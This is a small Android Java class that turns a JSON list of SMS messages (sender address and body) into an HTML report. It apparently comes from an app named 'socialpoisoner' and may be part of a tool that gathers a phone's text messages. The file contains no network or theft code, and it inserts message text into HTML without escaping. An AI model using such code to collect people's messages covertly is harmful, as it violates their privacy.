package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

/**
 * Created by doctorrabb on 16.07.16.
 */
public class messageBuilder {

    private JSONObject jsonObject;

    public messageBuilder (JSONObject jsonObject) {
        this.jsonObject = jsonObject;
    }

    public String buildToHtml () {
        String html = "<h1>SMS Data</h1>";
        try {
            for (int i = 0; i < this.jsonObject.getJSONArray ("sms").length(); i++) {
                html += "<br><br><br><h2>" + this.jsonObject.getJSONArray ("sms").getJSONObject (i).getString ("address") + "</h2><br><h3>" + this.jsonObject.getJSONArray ("sms").getJSONObject (i).getString ("body") + "</h3>";
            }
        } catch (JSONException e) {
            Log.e ("To Json Error!", e.getMessage());
            return null;
        }

        return html;
    }

}
